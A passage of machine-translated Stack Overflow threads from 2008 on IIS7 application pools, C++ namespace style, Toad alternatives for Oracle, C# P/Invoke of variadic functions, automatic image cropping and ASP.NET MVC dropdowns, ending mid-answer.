> 在评估初始化它的闭包之后，我们可以考虑在运行时替换静态约束属性的值。然而，这可能有点“太多”的魔力。人们怎么想？
> 
> 仅供参考，现在是这样，因为直到 0.4（如果我记得）约束不是静态的，而在 0.4 中它们仍然可以是非静态的。只有在 0.5
> 中，我们才会抛出异常/忽略非静态约束。

# iis - 应用程序池 IIS7

> ID：214915
> 
> 赞同：2
> 
> 时间：2008-10-18T11:20:23.427
> 
> 标签：iis, vbscript, scripting

我正在尝试使用 vb 脚本将应用程序池分配给 IIS7 中的一个网站：

```
' Connect to the WMI WebAdministration namespace.'
Set oWebAdmin = GetObject("winmgmts:root\WebAdministration")

' Retrieve the application and display its Web site name and path.'
Set oApp = oWebAdmin.Get("Application.SiteName='Default Web Site',Path='/site'")

' Specify a new application pool name and save it.'
oApp.ApplicationPool = "NewAppPool"
oApp.Put_ 
```

上面的脚本不起作用！

有没有更好的方法在 IIS（使用脚本）下将应用程序池分配给网站？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-18T11:37:32.283

您是在网站上还是在虚拟目录上设置应用程序池？

即，“默认网站/站点”（虚拟目录）或只是“站点”（网站）。

如果您尝试将其设置在网站上，而不是虚拟目录上，则需要执行以下操作：

```
Set oWebAdmin = GetObject("winmgmts:root\WebAdministration")
Set oSite = oWebAdmin.Get("Site.Name='Site'")
oSite.ApplicationDefaults.ApplicationPool = "NewAppPool"
oSite.Put_ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-23T02:33:19.920

正确的方法是：

```
Set oWebAdmin = GetObject("Application.Path='/site',SiteName='Default Web Site'") 
```

代替：

```
Set oWebAdmin = GetObject("Application.SiteName='Default Web Site',Path='/site'") 
```

# c++ - 你更喜欢显式命名空间还是 C++ 中的“使用”？

> ID：214927
> 
> 赞同：17
> 
> 时间：2008-10-18T11:30:22.533
> 
> 标签：c++, namespaces, using

使用 C++ 命名空间时，您是否更喜欢显式命名它们，如下所示：

```
std::cout << "Hello, world!\n"; 
```

还是您更喜欢`using namespace`：

```
using namespace std;
cout << "Hello, world!\n"; 
```

如果您更喜欢后者，您是否在文件或函数范围内声明您的使用？

就我个人而言，我更喜欢明确地命名它们——它的类型更多，但是当使用混合命名空间（例如`std`和`boost`）时，我发现它更具可读性。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2008-10-18T11:39:13.340

我总是使用明确的。写 std 不会伤害我，我清楚地看到它来自哪里。当您有一些遗留项目需要使用它自己的“字符串”、“向量”等来维护时，它会很有用。代码携带的信息越多越好。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2008-10-18T12:07:24.720

额外的输入不是这里的问题。显式限定名称的问题是视觉混乱。让我们面对现实吧，C++ 语法是杂乱无章的。无需通过不必要地延长名称并在代码中大量使用`::`s 来使情况变得更糟。

我和 Jeff Atwood 在一起：[最好的代码就是没有代码](http://www.codinghorror.com/blog/archives/000878.html)。这是真的。

命名空间导入是减少混乱的好方法，没有任何缺点：只要打开的命名空间的范围减少到单个编译单元¹，如果出现名称冲突，就可以轻松解决。

为什么显式名称应该（通常）更具可读性对我来说一直是个谜。读者通常应该对代码足够了解，以便能够推断出语义。如果不是，则代码无论如何都需要修复。

* * *

^(1）)推论：没有`using`标题！

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2008-10-18T11:35:34.083

我总是`using namespace`用于标准和提升。其他一切我倾向于使用显式命名空间，除非它使用得太多以至于会使代码混乱。

在标头中，我从不使用`using namespace`以避免污染#include 源的全局命名空间。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-18T12:05:13.197

我的一般规则是始终在标头中显式使用命名空间，并且通常在代码中使用 using。前者的原因是在定义的每个部分中明确说明正在使用什么，而后者的原因是如果有必要，它可以很容易地使用来自另一个命名空间的替换。即，如果我们想开始使用 foo::string 而不是 std::string，我们只需要更新标头和 using 语句，而不是在代码中用 foo::string 替换 std::string 的每个实例。

当然，这对于驻留在 std:: 命名空间中的类不太有用，因为即使您替换了一个类，您仍然可能在 std 中使用其他类，并且可能会遇到歧义问题，但这只是一个示例。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-10-18T15:05:03.923

`using`并且`using namespace`对于使代码更具可读性非常有用 - 消除混乱。

但在任何情况下，如果很难找出符号的来源，我拒绝导入它的整个命名空间。

我尝试限制导入命名空间的范围：

```
void bar() {

   // do stuff without vector

   { using std::vector;
      // do stuff with vector
   }

   // do stuff without vector
} 
```

对于“众所周知”的库，比如`std`，我敢于使用`using namespace std`. 有理由相信阅读此代码的每个人都知道这些符号。

作为旁注，该`using`关键字还用于指示派生类还导出其超类的重载成员。

```
class A {
  void f( A  );
  void f( bool );
};

class B : public A {
  using A::f; // without this, we get a compilation error in foo()
  void f(bool);
};

void foo() {
  B b;
  b.f( A() ); // here's a compilation error when no `using` is used in B
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-18T11:37:51.567

当有一些歧义时，我只使用显式命名空间。它更具可读性，但是额外的输入太乏味了，并且您必须假设其他开发人员对标准库具有基本的熟悉程度。

我拼写命名空间的唯一其他时间是我只使用它一次或两次，例如添加快速调试语句，或者我正在使用一些非标准库。

我通常在文件范围内声明命名空间，但如果您正在混合命名空间，则将声明放在更接近使用它的点（在函数范围内）可能是有意义的。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-18T13:09:49.103

`using`在函数范围内，或者如果函数非常小（通常是），只需显式命名空间

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-10-18T18:23:29.140

我倾向于在 .cpp 文件的顶部显式导入我需要的名称，所以......

使用 std::cout；使用 std::endl；

ETC...

这样我就可以控制我使用的名称，并且很容易看到它们的来源，并且代码在使用时不会混乱。

在我使用来自不同命名空间的两个名称的极少数情况下，我会在使用时完全限定它们。

我总是在标题中使用完全限定的名称，并且几乎从不在任何地方使用“使用命名空间 x”...

# database - 蟾蜍的替代品

> ID：214930
> 
> 赞同：56
> 
> 时间：2008-10-18T11:33:02.310
> 
> 标签：database, oracle

我目前正在使用[Toad](http://www.toadsoft.com/)进行数据库的日常工作（查询、更新、小脚本、数据库对象浏览等）。

我的问题是：由于我的 Toad 版本旧且有缺陷，哪些是 Toad 的（可能免费但不一定）替代品？

我们使用的数据库版本是 10g 和 9i。

非常感谢。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2008-10-18T11:53:58.413

Oracle 的[SQL 开发人员](http://www.oracle.com/technology/products/database/sql_developer/index.html)。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2008-10-18T14:39:20.920

[来自http://www.allroundautomations.nl/](http://www.allroundautomations.nl/)的PL/SQL Developer 。在 Toad 和 PL/SQL 开发人员之间进行选择时，大约一半的开发人员更喜欢 PL/SQL 开发人员。我不得不承认 PL/SQL 开发人员的代码完成要好得多，但我仍然更喜欢 Toad 的 DBMS 管理功能。

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2008-10-21T15:35:58.293

[TOra](http://tora.sourceforge.net/)是另一个不错的选择。我多年来一直使用 GPL 之前的版本。它是 Oracle 的一个很好的简单 SQL 工具。

它支持模式浏览、分析计划、有限调试以及您期望的所有内容。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2008-10-18T11:50:20.573

我使用了[Squirrel-SQL](http://www.squirrelsql.org/)（这是一个基于 Java/JDBC 的程序，可以与任何提供驱动程序的操作系统或数据库一起使用）和 Eclipse 的[数据库开发工具（Eclipse-DTP）](http://www.eclipse.org/datatools/)。对于轻量级的数据库工作来说，两者当然都足够了。两者都是免费和开源的。

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2008-10-21T17:01:19.150

在尝试了几个月的其他产品后，我又回到了 Toad。
我不得不承认（恕我直言，以及我正在使用它的类型）：**我没有找到 Toad 的替代品**。

其他产品中缺少的不可或缺的功能是：

1.  速度。蟾蜍速度极快；如果您打开超过 2 或 3 个连接，SQL Developer 就会开始爬网。当你不得不在时间限制的情况下操作时，你真的迫不及待地想要打开 SQL Developer。

2.  “在提交之前打开一个新窗口”功能（在插入或更新语句之后打开一个新窗口，并且您被迫提交或回滚）。避免挂起的提交真的很方便。

3.  “执行当前语句”功能（shift-F9）。SQL Developer 没有它，或者您被迫选择要执行的查询。

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2008-10-22T02:00:35.550

我很惊讶没有人提到[DbVisualizer](https://www.dbvis.com/)。我们公司已经使用它几年了，每个人似乎都对它很满意。它功能强大，可在多个平台（基于 Java）上运行并支持不同的数据库系统（Oracle、DB2、MS Access 等）。它有一个免费版本；如果您需要更多功能，可以使用商业版本。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2009-09-29T01:20:50.100

简单的答案：
使用 Textpad 或其他文本编辑器。

说明：

对我来说，PL/SQL 开发是一个随着时间而演变的过程。我尝试将持续改进应用于 SQL 开发，并且对我来说效果非常好。（有关持续改进/Kaizen 的更多信息，请参阅[链接文本](http://en.wikipedia.org/wiki/Kaizen)）

我发现 PL/SQL IDE 工具不稳定。

我遇到过 Quest Software 的 TOAD 和 Quest Software 的 SQL Navigator 的几次崩溃（我从第 3 版开始就一直在使用它）。
我失去了工作。
我尝试了其他 IDE PL/SQL 工具。
这些工具也崩溃了。
我又丢了工作。
我很沮丧。

我不相信任何 PL/SQL IDE 工具的 PL/SQL 软件开发。

以下是我的 PL/SQL 编码核心实践：
1\. 使用 Quest Software TOAD 导出代码
2\. 使用 Cygwin bash 脚本将文件移动到适当的目录
3\. 通过 BeyondCompare 比较版本（如果需要）
4\. 从 WinCVS 中检查代码 / CVSNT（如果需要）
5\. 使用 TextPad 编辑
6\. 通过 BeyondCompare 比较版本（如果需要）
7\. 将代码签入 WinCVS / CVSNT（如果需要）
8\. 使用 Cygwin bash 脚本创建主更改文件。
9\. 使用 Quest Software TOAD 导入代码

更冗长的解释：

我使用 Quest Software TOAD 将所有 PL/SQL 和表 DDL 代码导出到文件系统。

在数据库菜单 -> 导出 -> 源代码
在 Database 菜单 -> Export -> Table Scripts

这为每个数据库对象获取了单独的文件。 我根据文件扩展

名将这些文件（Cygwin bash 脚本）移动到目录中。 /procedures 中的 *.prc 文件 /functions 中的 *.fnc 文件 /proceudres 中的 *.pks 和 *.pkb 文件 /triggers 中的 *.trg 文件 /views 中的 *.vw 文件 /table_scripts 中的 *.sql 文件 这些文件最初是签入 CVS。 （我使用 WinCVS/CVSNT 服务器端） I Beyond 将 TOAD 导出的每个文件版本 与 CVS 中已有的版本进行比较。 我确保 CVS sql 存储库是最新的。 换句话说，我需要有一个好的起始基线。

然后我使用 TextPad 编辑 PL/SQL 代码。
[链接文本](http://www.textpad.com/)

我用 SQL 语法文件预先配置了我的 Textpad，
以便更容易看到
[链接文本](http://www.textpad.com/add-ons/syna2g.html)

编辑后，我将每个编辑后
的文件版本与
WinCVS 中的版本进行比较。

幸运的是，WinCVS 允许您使用非常方便的外部
差异（Beyond Compare）。

我通过 TOAD 将新的/更改的代码加载到测试模式中。
在 SQL Editor 菜单 -> Load and Execute a Script File

中，我测试了代码。（做一些调试运行）

如果代码测试出来，我将代码签入 CVS。

最后，我使用 Cygwin bash（以及我编写的一个 bash 脚本）来创建一个主更改文件。此主更改文件包含需要应用以使实时模式保持最新的所有更改。这节省了我很多时间。

然后我通过 TOAD 将新的/更改的代码加载到实时模式中。在 SQL Editor 菜单 -> Load and Execute a Script File 中。就是这样。软件工程是关于流程、版本控制 (CVS) 和自动化构建（bash 脚本）的。

所有这一切中最大的教训（使我的工作效率提高了 10 倍）是从基于 DB 的 PL/SQL IDE 切换到简单的 ASCII 文本文件。KIS 在行动。

如果您的代码副本位于 ASCII 文件中，您可以避免：
- 搞砸数据库
- 锁定数据库对象
- 基于 iffy DB 的修订控制工具（如果有）
- iffy DB 差异工具（如果有）
- 由于 IDE 崩溃
而丢失代码 - 由于 DB 崩溃/关闭
而丢失代码 - 由于并发编辑而丢失代码（如果两个或更多的 PL/SQL 开发人员编辑相同的过程）

相反，如果您处理文件系统 ASCII 文件中的所有 PL/SQL 代码，那么您有
- 您选择的文本编辑器（TextPad、notepad++、vi 等）
- 您选择的修订控制系统（CVS、 svn)
- 你选择的文本过滤/处理/脚本系统 (我喜欢 Cygwin bash)
- 你选择的 diff 工具 (Beyond Compare,WinDiff,diff)
- 你选择的 DB 工具 (我可以使用 TOAD, SQL Navigator) 来导入并将 PL/SQL 代码导出到文件。

我想要所有代码更改的版本历史。
我想让每个人都一起工作，防止开发人员互相踩脚。
我想要自由选择我的工具。
这样做的副作用是我在快速开发过程中处理了文件系统中的所有数据库代码。

只是我的2美分。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-10-21T12:12:06.473

我将投票给[SQLPal](http://www.pebblereports.com/sqlpal/)。免费。它的大部分功能都非常好用（自动竞争似乎从来没有用过）。我每天都在 10g 的数据库上使用它，效果很好。

![替代文字](https://i.stack.imgur.com/862J5.png)

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-10-24T13:16:10.493

很长一段时间以来，我一直在使用 Benthic Software 的 Golden 作为 SQL*Plus 的替代品，并且喜欢它。

[http://www.benthicsoftware.com/products.htm](http://www.benthicsoftware.com/products.htm)

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2012-01-17T16:13:31.803

如果我们必须付费，那么我强烈推荐 PL/SQL Developer 用于数据库代码编写和 TOAD 用于管理任务。

到目前为止，我一直在使用免费的解决方案，尤其是其中的四个：(Oracle) SQL Developer、SQL Tools、SQLPal 和 TORA。

*   我发现 SQL Developer 是拥有最多实用程序的那个。不幸的是，它的 java GUI 使它容易挂起太多。
*   SQL 工具是一个非常好的工具，除了一件事：它没有自动填充功能/代码完成（例如表名和列）。如果你能通过这个问题，那么......去吧。
*   SQLPal 很好，只要您一次只能查看一个数据库
    对象。我只是不明白为什么显示一个简单的
    新窗口实际上意味着打开一个全新
    的应用程序实例。它具有自动填充功能，但这使它非常滞后。我会为其仅 JDBC 可用的连接选项加上一个减号。这种限制有时会在等待检索数据库元字典信息时挂起。
*   TORA - 这是一个很好的工具，除了代码完成......我只是无法让它工作。从论坛中我可以了解到这是一个非常普遍的问题。否则它的 GUI 几乎是完美的。

我的结论：我不想这么说，我是一个开源爱好者，但是......如果你必须密集地使用这些工具，只需购买 PL/SQL Developer / TOAD。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-18T12:53:07.717

我也会推荐 Oracle 的 SQL Developer，但我发现[WinSQL](http://www.synametrics.com/SynametricsWebApp/WinSQL.jsp "温SQL")也相当不错。SQL Developer 是免费的，WinSQL 有一个非常强大的社区版本，并且在其他平台上也能很好地工作（我也将它用于与 Netezza 一起工作）。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-21T12:21:04.193

我使用 DevArt 的 OraDeveloper 连接到 Oracle 数据库。这很好，因为它插入 Visual Studio 的方式与可以通过服务器资源管理器查询 SQL Server 数据库的方式非常相似。它不是免费的，但在我们的案例中，它是通过购买 OraDirect .Net 来免费提供的，这是一个允许 Oracle 与 Microsoft 的实体框架一起工作的新提供商。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-10-21T15:21:56.683

使用 TOAD 从事一项工作 3 年，现在使用 PL/SQL Developer 从事当前工作 5 年，我想说总体上 TOAD 是一个更好的工具，但如果您专门在 PL/SQL 中开发存储过程，PL/SQL Developer更好。

不要忘记设置上下文相关帮助（在帮助 - HTML 手册下）

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-10-21T15:25:01.713

您也可以使用我的一些同事更喜欢的[sqltools 。](http://www.sqltools.net/)我从来不习惯，但看起来很强大。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-10-22T23:18:53.600

我使用 PL/SQL Developer 运行多个查询和存储过程开发，因为它坚如磐石，您可以通过任务管理器终止该进程，并在重新启动时取回所有窗口。我使用 TOAD 进行浏览，因为该功能无可匹敌。但它对我来说是片状的，挂着等，虽然那可能是我的电脑..我会买两个。我现在两个都开了。

为了访问奇怪的源（OSISoft PI、AS400 上的 JDE、4D、Access、Excel），我使用[Advanced Query Tool](http://advancedquerytool.com)。能够对建议表的 Excel 工作表使用 SQL 来创建 DDL 非常棒。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-10-24T13:19:39.863

我爱蟾蜍。我不得不改用 Embarcadero 的 Rapid SQL 两个月，这该死的差点要了我的命。因此，虽然我不知道有什么产品比 Toad*更好*，但我可以毫无保留地说 Rapid SQL 完全不够用。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2011-01-14T16:33:32.347

我们将[RazorSQL](http://www.razorsql.com/)用于 Oracle 和 DB2。它成本低，功能丰富。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2008-10-18T11:45:44.310

PLSQL Developer 对 Oracle DBMS 非常好，特别是对 Stored Proc，但对 DBMS 管理不太好。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2008-10-19T02:08:49.230

只是把它扔出去 - 你知道你可以获取 Toad 4.1 的测试版并免费使用它吗？Beta 版始终对公众免费。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2008-10-20T13:49:41.190

我用过 Embarcadero DBArtisan（不是免费的）

我曾经以为它不错。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2008-10-21T15:26:28.780

我支持 SQL Developer 的评论。FWIW，Toad 的较新版本比老歌稳定得多。我正在使用 Toad 9.7，它非常好。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2008-10-24T13:30:03.290

我正在使用**PL/SQL Developer**，我认为它是最好的 oracle 数据库工具之一，它既精简又快速，我的 USB 闪存中有一个副本，可以让我在任何电脑上使用它（你只需从程序中复制它文件夹并将其放在闪存中，它会正常工作）。

另外我三个月前从 DevArt购买了**OraDeveloper ，它有一些不错的功能，但它比 PL/SQL Developer 慢，并且需要 .Net 框架。**但好处是它直接连接到 Oracle，因此您可以在任何 PC 上使用它，而无需安装 Oracle 客户端。

另一个工具是**EMS SQL Management Studio** for Oracle，它看起来不错，并且具有一些不错的功能，特别是从其他格式导入/导出。 [http://sqlmanager.net/en/products/studio/oracle](http://sqlmanager.net/en/products/studio/oracle)

您可以免费使用**AnySQL Maestro**，它支持 Oracle/MySql/Sql 服务器并免费提供 AnySql Maestro [http://www.sqlmaestro.com/](http://www.sqlmaestro.com/)

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2009-02-26T17:31:10.683

我已经尝试了上面建议的大多数工具，发现我更喜欢这个工具（包括 TOAD）： [SQLDetective](http://www.conquestsoftwaresolutions.com/page/sqldetective_at_a_glance)

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2011-01-10T11:58:33.933

[SQL Studio for Oracle](http://www.sqlmanager.net)真的很不错...

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2011-05-16T04:16:06.753

[Dreamcoder](http://www.sqldeveloper.net/)为数据库管理提供了一套很好的工具。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2012-08-14T21:14:14.080

我更喜欢**Toad**或**SQL Developer**。但我更偏爱 Toad，因为它具有以下功能 -

> 如果您想在 toad 中更新您的选择结果，只需添加 ROWID 就是您的选择语句。一旦您选择了带有 ROWID 的记录，您就可以编辑/更新您的结果网格。

![在此处输入图像描述](https://i.stack.imgur.com/0Uauy.png)

此外，Toad 中的会话和数据库监控监控功能要好得多。Toad 唯一的缺点是它需要安装 Oracle SQL 客户端（任何其他非 Oracle 品牌的工具可能就是这种情况），另一方面，SQL Developer 不需要安装 Oracle SQL 客户端。

* * *

## 回答 #27

> 赞同：-1
> 
> 时间：2008-10-20T13:27:31.500

与 PL/SQL 开发人员一起工作。它摇摆不定。

# c# - C# 使用来自 CPP 的未知数量的 args 调用 CPP 函数

> ID：214953
> 
> 赞同：4
> 
> 时间：2008-10-18T11:56:04.633
> 
> 标签：c#, c++, interop, pinvoke, variadic-functions

我在 CPP 中有一个具有以下原型的函数：

```
char* complexFunction(char* arg1, ...); 
```

我使用 DLLImport 属性从 C# 导入它。问题是：如何在 C# 中定义原型（在 DLLImport 属性下）？我如何将参数传递给这个函数？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T12:07:10.413

这称为可变参数函数。关于对它们的 P/Invoke 支持的信息相当稀缺，这就是我发现的。

我找不到直接`DllImport`使用可变数量参数的函数的方法。我不得不将参数的`DllImport` *所有变体*作为不同的重载。

让我们以[wsprintf 为例](http://msdn.microsoft.com/en-us/library/ms647550(VS.85).aspx)。它有以下原型`winuser.h`：

```
int WINAPIV wsprintf(      
    LPTSTR lpOut,
    LPCTSTR lpFmt,
    ...); 
```

它可以像这样从 C# 中使用：

```
using System;
using System.Text;
using System.Runtime.InteropServices;

class C {

  // first overload - varargs list is single int
  [DllImport("user32.dll", CallingConvention=CallingConvention.Cdecl)]
  static extern int wsprintf(
    [Out] StringBuilder buffer,
    string format,
    int arg);

  // second overload - varargs list is (int, string)
  [DllImport("user32.dll", CallingConvention=CallingConvention.Cdecl)]
  static extern int wsprintf(
    [Out] StringBuilder buffer,
    string format,
    int arg1,
    string arg2);

  public static void Main() {
    StringBuilder buffer = new StringBuilder();
    int result = wsprintf(buffer, "%d + %s", 42, "eggs!");
    Console.WriteLine("result: {0}\n{1}", result, buffer);
  }
} 
```

现在解决您的`complexFunction`.

```
char* complexFunction(char* arg1, ...); 
```

它的可变参数列表应该以相同的方式处理：通过提供所有有用的重载。但是还有另一个复杂的地方——返回类型。我假设`complexFunction`分配并返回`char`. 在这种情况下，调用者很可能负责数组的释放。为此，您还应该导入释放例程，我们称之为`void free(void*)`.

假设所有这些假设，使用的 C# 代码`complexFunction`将如下所示：

```
using System;
using System.Text;
using System.Runtime.InteropServices;

class C {

  [DllImport("your.dll",
             CallingConvention=CallingConvention.Cdecl,
             CharSet=CharSet.Ansi)]
  static extern IntPtr complexFunction(
    string format,
    int arg1, int arg2);

  [DllImport("your.dll", CallingConvention=CallingConvention.Cdecl)]
  static extern void free(IntPtr p);

  public static void Main() {
    IntPtr pResult = complexFunction("%d > %s", 2, 1);
    string sResult = Marshal.PtrToStringAnsi(pResult);
    free(pResult);
    Console.WriteLine("result: {0}", sResult);
  }
} 
```

# algorithm - 关于图像裁剪算法的困境 - 有可能吗？

> ID：214987
> 
> 赞同：6
> 
> 时间：2008-10-18T12:41:36.803
> 
> 标签：algorithm, image-processing, computer-vision

我正在使用 .NET 3.5（ASP.NET、SQL Server、C#、WCF、WF 等）构建一个 Web 应用程序，但我遇到了一个主要的设计困境。顺便说一句，这是一个 uni 项目，但我开发的内容 100% 取决于我。

我需要设计一个系统，让我可以拍摄图像并自动裁剪其中的某个对象，而无需用户输入。例如，在道路图片中剪下汽车。我已经考虑了很多，我看不到任何可行的方法。我想这个线程是讨论实现这个目标的问题和可行性。最终，我会获得汽车的尺寸（或任何可能的尺寸），然后将其作为参数传递到 3d 建模应用程序（自定义）中，以渲染 3d 模型。最后一步更可行。种植问题是个问题。我已经想到了各种各样的想法，比如获得汽车的颜色，然后是围绕该颜色的轮廓。因此，如果汽车（示例）是黄色的，则当图像中有黄色像素时，请在其周围进行跟踪。

理想情况下，我希望系统完全自动化。但我想我不可能拥有一切。此外，我的技能是我上面提到的（.NET 3.5、SQL Server、AJAX、网页设计），而不是 C++，但我愿意接受任何解决方案，只是为了看看可行性。

我还找到了这个专利：[美国专利 7034848 - System and method for automatic cropping graphics images](http://www.patentstorm.us/patents/7034848.html)

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-18T23:40:54.600

[这是完成DARPA 大挑战](http://www.darpagrandchallenge.com/)需要解决的问题之一。谷歌视频有[来自获胜团队的项目负责人的精彩演示](http://video.google.com/videoplay?docid=8594517128412883394)，他在其中谈到了他们如何解决他们的解决方案，以及其他一些团队如何接近它。相关部分在视频的 19:30 左右开始，但这是一场精彩的演讲，整件事都值得一看。希望它为您解决问题提供了一个良好的起点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-22T16:50:33.493

一种经常用于图像中人脸检测的方法是通过使用 Haar 分类器级联。可以训练分类器级联来检测任何对象，而不仅仅是人脸，但分类器的能力高度依赖于训练数据的质量。

[Viola 和 Jones](http://www.merl.com/reports/docs/TR2004-043.pdf)的这篇论文解释了它的工作原理以及如何对其进行优化。

虽然它是 C++，但您可能想看看[OpenCV](http://sourceforge.net/projects/opencvlibrary/)项目提供的图像处理库，其中包括训练和使用 Haar 级联的代码。您将需要一组汽车和非汽车图像来训练系统！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-19T02:23:11.883

你说的是一个开放的研究问题，甚至是几个研究问题。解决这个问题的一种方法是通过图像分割。如果您可以安全地假设图像中有一个感兴趣的对象，您可以尝试一种图形-地面分割算法。有很多这样的算法，而且没有一个是完美的。他们通常输出一个分割掩码：一个二值图像，其中图形是白色的，背景是黑色的。然后，您将找到图形的边界框，并使用它进行裁剪。要记住的是，现有的分割算法都不会在 100% 的时间里给你想要的东西。

或者，如果您提前知道需要裁剪哪种特定类型的对象（汽车、人、摩托车），那么您可以尝试对象检测算法。再一次，有很多，也没有一个是完美的。另一方面，如果您感兴趣的对象位于非常杂乱的背景上，其中一些可能比分割效果更好。

总而言之，如果你想追求这一点，你必须阅读大量的计算机视觉论文，并尝试大量不同的算法。如果你尽可能地限制你的问题域，你也会增加成功的机会：例如，将自己限制在少数对象类别中，假设图像中只有一个感兴趣的对象，或者将自己限制在某种类型场景（自然、海洋等）。还要记住，即使是解决此类问题的最先进方法的准确性也有很大的改进空间。

顺便说一句，这个项目的语言或平台的选择是迄今为止最不困难的部分。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T15:36:53.750

我确实说过照片，所以这可能是一辆黑色背景的黑色汽车。我确实想过指定对象的颜色，然后当找到该颜色时，围绕它进行追踪（高级解释）。但是，对于黑色背景中的黑色物体（换句话说，没有对比度），这将是一项非常困难的任务。

更好的是，我遇到了几个带有 3d 汽车模型的网站。我总是可以使用它，将它粘贴到 3d 模型中，然后渲染它。

3D 模型会更容易处理，而真实世界的照片则更难处理。它确实很烂:(

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-18T13:12:05.057

我见过的一些最好的尝试是使用大型图像数据库来帮助理解您拥有的图像。如今，您拥有 flickr，它不仅是一个巨大的图像语料库，而且还带有有关图像是什么的元信息的标记。

这里记录了一些这样做的项目：

[http://blogs.zdnet.com/emergingtech/?p=629](http://blogs.zdnet.com/emergingtech/?p=629)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T13:31:36.687

从自己分析图像开始。这样，您就可以制定匹配汽车的标准。你可以定义你无法匹配的东西。

例如，如果所有汽车都具有相同的背景，则不需要那么复杂。但是您的示例说明了街道上的汽车。可能有停放的汽车。他们应该被认可吗？

[如果您可以访问 MatLab，您可以使用PRTools](http://www.prtools.org/prtools.html)等专业软件测试您的模式识别过滤器。

我在学习的时候（很久以前：）我用过Khoros Cantata，发现边缘过滤器可以大大简化图像。

但同样，首先定义输入的条件。如果你不这样做，你就不会成功，因为模式识别真的很难（想想破解验证码需要多长时间）

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2008-10-18T12:53:19.353

如果我没看错……这就是人工智能的亮点。

我认为“最简单”的解决方案是使用基于神经网络的图像识别算法。除非您知道汽车在每张照片中看起来都*完全相同*，否则这几乎是唯一的方法。

如果完全一样，那么你可以只搜索像素模式，得到边界矩形，并将图像边框设置为矩形的内边界。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-10-18T13:28:31.983

我认为如果没有真正的用户告诉程序要做什么，你永远不会得到好的结果。这样想：你的程序应该如何决定何时存在超过 1 个*有趣*的对象（例如：2 辆汽车）？如果您想要的对象实际上是背景中的山怎么办？如果图片内没有任何感兴趣的内容，因此没有选择作为要裁剪的对象怎么办？等等等等……

话虽如此，如果您可以做出如下*假设*：只会出现 1 个对象，那么您可以尝试使用 using[图像识别算法](http://www.efg2.com/Lab/Library/ImageProcessing/Algorithms.htm)。
现在我想起来了。我最近得到了一个关于机器人人工智能和机器人研究技术的讲座。他们的研究继续关于[语言交互、进化和语言识别](http://www.csl.sony.fr/items/1998/the-naming-game/). 但为了做到这一点，他们还需要一些简单的图像识别算法来处理感知环境。他们使用的技巧之一是制作图像的 3D 图，其中 x 和 y 正常 x 和 y 轴和 z 轴是该特定点的亮度，然后他们对红绿值使用相同的技术，和蓝黄色。你瞧，他们有一些（相对）容易的东西，可以用来从感知环境中挑选出物体。
（我非常抱歉，但我找不到他们提供的漂亮图表的链接，这些图表显示了这一切是如何运作的）。

无论如何，关键是他们对图像识别不感兴趣（那么），所以他们创造了一些效果*足够好的*东西，使用了一些不太先进的东西，因此耗时更少，所以有可能为这个复杂的任务创造一些简单的东西。

此外，任何优秀的图像编辑程序都有某种*魔杖*，可以通过适当的调整来选择您指向的感兴趣的对象，也许这也值得您花时间研究一下。

所以，这基本上意味着你：

*   必须做出一些假设，否则它会非常失败
*   最好使用人工智能技术，更具体地说是图像识别
*   可以看看[paint.NET](http://www.getpaint.net/index.html)和他们的*魔杖算法*
*   尝试利用这样一个事实，即一张*好的*照片将在图像中间的某处有感兴趣的对象

..但我并不是说这是您问题*的*解决方案，也许可以使用更简单的方法。

哦，我会继续寻找那些链接，它们包含一些关于这个主题的非常有价值的信息，但我不能保证任何事情。

# asp.net-mvc - 将数据动态绑定到asp.net mvc中的下拉列表

> ID：214998
> 
> 赞同：7
> 
> 时间：2008-10-18T12:52:59.043
> 
> 标签：asp.net-mvc, data-binding

如何`<%Html.Dropdownlist....`在 ASP.NET MVC 中动态绑定数据？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-18T13:12:40.593

只需将正确的 IEnumerable 作为类型化模型或 ViewData 传递。尝试这样的事情（在我脑海中）：

```
